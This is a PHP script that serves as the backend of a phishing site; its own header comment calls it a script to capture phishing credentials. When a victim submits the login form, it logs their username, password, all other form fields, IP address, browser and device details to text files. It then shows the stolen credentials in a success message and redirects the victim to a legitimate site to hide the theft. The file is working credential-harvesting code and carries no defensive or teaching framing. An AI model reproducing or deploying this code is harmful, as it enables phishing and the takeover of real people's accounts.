<?php
// credentials.php - Script to capture phishing credentials
// This file is created by host_phishing_site.sh

// Set error reporting to capture all errors but not display them
error_reporting(E_ALL);
ini_set('display_errors', 0);

// Function to get the visitor's IP address
function getIP() {
    $ip = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ip = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ip = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ip = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ip = $_SERVER['REMOTE_ADDR'];
    else
        $ip = 'Unknown';
    return $ip;
}

// Initialize log files
$log_file = "credentials.txt";
$detailed_log = "detailed_capture.log";  // More detailed log for debugging
$date = date('Y-m-d H:i:s');
$ip = getIP();
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct Access';

// Get additional browser/device information
$browser_info = get_browser_info();
$device_type = determine_device_type($user_agent);

// Read the redirect URL from the file or use a default
$redirect_url = "https://www.google.com"; // Default fallback
if (file_exists('redirect_url.txt')) {
    $redirect_url = trim(file_get_contents('redirect_url.txt'));
}

// Create log entry header
$log_entry = "==== CREDENTIALS CAPTURED AT $date ====\n";
$log_entry .= "IP Address: $ip\n";
$log_entry .= "User Agent: $user_agent\n";
$log_entry .= "Browser: {$browser_info['browser']} {$browser_info['version']}\n";
$log_entry .= "OS: {$browser_info['platform']}\n";
$log_entry .= "Device Type: $device_type\n";
$log_entry .= "Referer: $referer\n";
$log_entry .= "Form Data:\n";

// Create a more detailed log entry for debugging
$debug_entry = $log_entry . "Raw POST data: " . print_r($_POST, true) . "\n\n";
file_put_contents($detailed_log, $debug_entry, FILE_APPEND);

// Capture all POST data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? $_POST['username'] : '(not provided)';
    $password = isset($_POST['password']) ? $_POST['password'] : '(not provided)';
    
    $log_entry .= "USERNAME: $username\n";
    $log_entry .= "PASSWORD: $password\n";
    
    // Log other submitted fields
    foreach ($_POST as $key => $value) {
        if ($key != 'username' && $key != 'password' && is_string($value)) {
            $log_entry .= "$key: $value\n";
        }
    }
} else {
    $log_entry .= "No POST data received\n";
}

$log_entry .= "==== END OF ENTRY ====\n\n";

// Write to log file
file_put_contents($log_file, $log_entry, FILE_APPEND);

// Function to get browser details
function get_browser_info() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = 'Unknown';
    $platform = 'Unknown';
    $version = 'Unknown';
    
    // Platform
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'Linux';
    } elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'Mac';
    } elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'Windows';
    } elseif (preg_match('/android/i', $u_agent)) {
        $platform = 'Android';
    } elseif (preg_match('/iphone|ipad/i', $u_agent)) {
        $platform = 'iOS';
    }
    
    // Browser
    if (preg_match('/MSIE/i', $u_agent) || preg_match('/Trident/i', $u_agent)) {
        $browser = 'Internet Explorer';
        if (preg_match('/Trident/i', $u_agent) && preg_match('/rv:([0-9.]+)/', $u_agent, $matches)) {
            $version = $matches[1];
        } else if (preg_match('/MSIE ([0-9.]+)/', $u_agent, $matches)) {
            $version = $matches[1];
        }
    } elseif (preg_match('/Edge/i', $u_agent)) {
        $browser = 'Edge';
        preg_match('/Edge\/([0-9.]+)/', $u_agent, $matches);
        $version = isset($matches[1]) ? $matches[1] : '';
    } elseif (preg_match('/Edg/i', $u_agent)) {
        $browser = 'Edge (Chromium)';
        preg_match('/Edg\/([0-9.]+)/', $u_agent, $matches);
        $version = isset($matches[1]) ? $matches[1] : '';
    } elseif (preg_match('/Firefox/i', $u_agent)) {
        $browser = 'Firefox';
        preg_match('/Firefox\/([0-9.]+)/', $u_agent, $matches);
        $version = isset($matches[1]) ? $matches[1] : '';
    } elseif (preg_match('/Chrome/i', $u_agent) && !preg_match('/OPR/i', $u_agent)) {
        $browser = 'Chrome';
        preg_match('/Chrome\/([0-9.]+)/', $u_agent, $matches);
        $version = isset($matches[1]) ? $matches[1] : '';
    } elseif (preg_match('/Safari/i', $u_agent) && !preg_match('/Chrome/i', $u_agent)) {
        $browser = 'Safari';
        preg_match('/Version\/([0-9.]+)/', $u_agent, $matches);
        $version = isset($matches[1]) ? $matches[1] : '';
    } elseif (preg_match('/Opera/i', $u_agent) || preg_match('/OPR/i', $u_agent)) {
        $browser = 'Opera';
        if (preg_match('/OPR/i', $u_agent)) {
            preg_match('/OPR\/([0-9.]+)/', $u_agent, $matches);
        } else {
            preg_match('/Version\/([0-9.]+)/', $u_agent, $matches);
        }
        $version = isset($matches[1]) ? $matches[1] : '';
    }
    
    return array(
        'browser' => $browser,
        'version' => $version,
        'platform' => $platform
    );
}

// Function to determine device type
function determine_device_type($user_agent) {
    if (preg_match('/mobile|android|iphone|ipad|phone/i', $user_agent)) {
        if (preg_match('/tablet|ipad/i', $user_agent)) {
            return 'Tablet';
        }
        return 'Mobile';
    }
    return 'Desktop';
}

// Create a simple console output for real-time monitoring
echo "SUCCESS! Credentials have been captured and saved!\n";
if (isset($username) && !empty($username)) {
    echo "Username: $username\n";
}
if (isset($password) && !empty($password)) {
    echo "Password: $password\n";
}

// Redirect to legitimate site
header("Location: $redirect_url");
exit;
?> 